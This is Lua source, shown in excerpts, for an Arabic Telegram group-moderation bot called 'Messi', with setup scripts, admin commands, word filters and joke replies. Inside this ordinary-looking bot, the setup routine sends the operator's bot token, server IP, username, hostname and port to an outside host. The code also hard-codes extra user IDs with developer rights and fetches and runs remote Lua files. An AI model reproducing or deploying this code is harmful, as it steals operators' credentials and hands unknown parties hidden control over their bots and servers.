...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\naٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31mٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua Messi.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n\27[0;33;49m')
local SUDOID = io.read():gsub(' ','') 
if tostring(SUDOID):match('%d+') then
data,res = https.request("https://black-source.tk/Dr/index.php?bn=Messi&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://black-source.tk/Dr/index.php?n=Messi&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua Messi.lua')
end 
end
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ┉"
exit 1
fi
if [ ! $token ]; then
echo "ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉"
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Messi.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S MESSI -X kill
screen -S MESSI ./MESSI
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedsiria/test/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1726705278,1723048295,1770288756}   
...
var = true  
elseif tonumber(user_id) == tonumber(1723048295) then
var = true  
...
local UserName = (data.username_ or "Messidaola")
...
local MESSI _Msg = ''  
if msgs < 100 then 
MESSI _Msg = 'غير متفاعل' 
elseif msgs < 200 then 
MESSI _Msg = 'بده يتحسن' 
elseif msgs < 400 then 
MESSI _Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
MESSI _Msg = 'متفاعل' 
elseif msgs < 1200 then 
MESSI _Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
MESSI _Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
MESSI _Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
MESSI _Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
MESSI _Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
MESSI _Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
MESSI _Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
MESSI _Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
MESSI _Msg = 'رب التفاعل'  
end 
return MESSI _Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𓆩Messi𓆪.")  
...
function plugin_MESSI (msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.MESSI  and msg then
pre_msg = plugin.MESSI (msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceMESSI (msg,data) -- بداية العمل
if msg then
...
{'ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ'},
{'قناة السورس'},
{'ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ'},
{'تويت','صراحه'},
{'ٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ'},
...
send(msg.chat_id_, msg.id_,MESSI _Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf MESSI .lua')
os.execute('wget https://raw.githubusercontent.com/ahmedsiria/test/main/MESSI .lua')
...
{{text = 'اقمـد من القمـدن  ياروحـي.', url="t.me/KLOSHa2"}},
}
...
send(msg.chat_id_, msg.id_,'℘︙  عدد المجموعـات الان » { '..#group..' }'..MESSI k..''..MESSI ..'\n℘︙  الان عدد المجموعـات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n♡︙ العضو » ['..result.title_..'](t.me/'..(username or 'Messidaola')..')'
status  = '\n♡︙ تم ترقيته مطور'
...
usertext = '\n♡︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Messidaola')..')'
status  = '\n♡︙ تم ترقيته مطور'
...
local MESSI 1_Msg = database:get(bot_id.."MESSI 1:Add:Filter:Rp2"..text..msg.chat_id_)   
if MESSI 1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'♡︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Messidaola')..') \n♡︙ '..MESSI 1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if MESSI _Msg and not Special(msg) then  
local MESSI _Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if MESSI _Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"♡︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n♡︙ ["..MESSI _Msg.."] \n")
else
send(msg.chat_id_,0,"♡︙ العضو : {["..data.first_name_.."](T.ME/Messidaola)}\n♡︙ ["..MESSI _Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "♡︙ عذرا » {["..data.first_name_.."](T.ME/Messidaola)}\n♡︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."MESSI :blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."MESSI :blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."MESSI :blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."MESSI :teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."MESSI :nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."MESSI :teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."MESSI :nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."MESSI :teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."MESSI :teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MESSI :Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."MESSI :nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."MESSI :nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."MESSI :nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "Messidaola")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."MESSI :teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local MESSI ChengName = database:get(bot_id.."MESSI :Cheng:Name"..data.id_)
if not data.first_name_ then 
if MESSI ChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..MESSI ChengName..']')
database:del(bot_id.."MESSI :Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if MESSI ChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."MESSI :Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local MESSI ChengUserName = database:get(bot_id.."MESSI :Cheng:UserName"..data.id_)
if not data.username_ then 
if MESSI ChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..MESSI ChengUserName..']')
database:del(bot_id.."MESSI :Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if MESSI ChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."MESSI :Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local MESSI ChengPhoto = database:get(bot_id.."MESSI :Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if MESSI ChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."MESSI :Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if MESSI ChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."MESSI :Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
local Text = [[
✨  𝑾𝑬𝑳𝑪𝑶𝑴 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 Messi  ✨
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' KLOSHA℡  ',url="t.me/KLOSHa2"}},
{{text = ' ℡BAR KLOSHA  ',url="t.me/Messidaola"}},
}
local msg_id = msg.id_/2097152/0.5
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'♡︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Messidaola')..') \n♡︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'♡︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Messidaola')..') \n♡︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedsiria/test/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n♡︙ اهلا بك في متجر ملفات الوون\n♡︙ ملفات السورس ↓\nٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n\n"
local TextE = "\nٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n♡︙ علامة تعني { ✔️ } ملف مفعل\n♡︙ علامة تعني { ✖ } ملف معطل\n♡︙ قناة سورس الوون ↓\n".."♡︙ [اضغط هنا لدخول](t.me/Messidaola) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedsiria/test/main/File_Bot/"..file)
if res == 200 then
...
local UserName = (b.username_ or "SRC-MESSI ")
...
function Function_MESSI (extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_MESSI , nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_MESSI , nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n♡︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Messidaola')..')'
status  = '\n♡︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n♡︙ العضو » '..userid..''
...
t = "\n♡︙ قائمة محظورين الكروب \nٴ≪ـــــــــــــــــــــ𓆩Messi??ـــــــــــــــــــــ≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
'\nءٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ'..
'\n♡︙  علامة ال {🔓} تعني مفعل'..
'\n♡︙  علامة ال {🔐} تعني معطل'..
'\nءٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ'..
'\n♡︙  الروابط » { '..lock_links..
...
database:set(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"♡︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."MESSI 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."MESSI 1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"♡︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."MESSI 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."MESSI 1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."MESSI 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"♡︙ ارسل الكلمه الان")  
database:set(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MESSI 1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."MESSI 1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."MESSI 1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."MESSI 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MESSI 1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."MESSI 1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n♡︙ قائمة المنع \nٴ≪ـــــــــــــــــــــ𓆩Messi𓆪ـــــــــــــــــــــ≫ٴ\n"
for k,v in pairs(list) do  
local MESSI _Msg = database:get(bot_id.."MESSI 1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..MESSI _Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n♡︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Messidaola')..')'..'\n♡︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..MESSI _Msg[math.random(#MESSI _Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n♡︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:MESSI :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:MESSI :List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MESSI :Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:MESSI :Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:MESSI :Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:MESSI :Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:MESSI :Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:MESSI :List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:MESSI :List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:MESSI :Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:MESSI :Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:MESSI :Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:MESSI :List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 Messi.',url="t.me/Messidaola"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."Messidaola:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."Messidaola:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."Messidaola:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."Messidaola:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Messidaola:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Messidaola:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
database:set(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:MESSI :Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:MESSI :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MESSI :Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MESSI :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MESSI :Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MESSI :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:MESSI :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MESSI :Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:MESSI :Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:MESSI :Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:MESSI :Add:Rd:Sudo:Text2"..text)   
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Messidaola')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
MESSI dx(msg.chat_id_, msg.id_, '♡︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n♡︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n♡︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n♡︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/Messidaola"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━━━  Messi 𖠱²² ━━━━━━⩺\n℘︙ ➫ .[ ❍ ┇𓆩Messi𓆪. ](t.me/Messidaola)➤ ')
end
...
🍁الاشعارات
⩹━━━━━━  Messi 𖠱²² ━━━━━━⩺
[🍁S O R C E  Messi 𖠱²² 🍁](t.me/Messidaola)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🍁صورتي 
⩹━━━━━━  Messi 𖠱²² ━━━━━━⩺
[🍁S O R C E  Messi 𖠱²² ⚡️](t.me/Messidaola)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🗯️التاريخ
⩹━━━━━━  Messi 𖠱²² ━━━━━━⩺
[🗯️ S O R C E  Messi 𖠱²² 🗯️](t.me/Messidaola)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = 'S O R C E  Messi 𖠱²²', url="t.me/Messidaola"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/Messidaola)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/Messidaola)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/Messidaola)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/Messidaola)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/Messidaola)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/Messidaola)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/Messidaola)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يولا يا وسخ 🥵](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي ❤️](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[اوماااااال يا جدع 😹❤️](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[تيب تيب يعسل 😁](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بلاش نكد بحبك 😁 ](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يستر عايز اي 🤭](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/Messidaola)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/Messidaola)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/Messidaola)') 
return false
end
end
end
...
{{text = '⸘⸘ ❪SＯＵＲＣＥ❫ ⸘⸘', url="t.me/Messidaola"}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
end
...
if text == 'ميسي' or text == 'احمد' or text == 'س' then
local Text = [[
𓆩 اقـــمــــد مــن الـــقــمــدان يـــآروحـــي 𓆪
]]
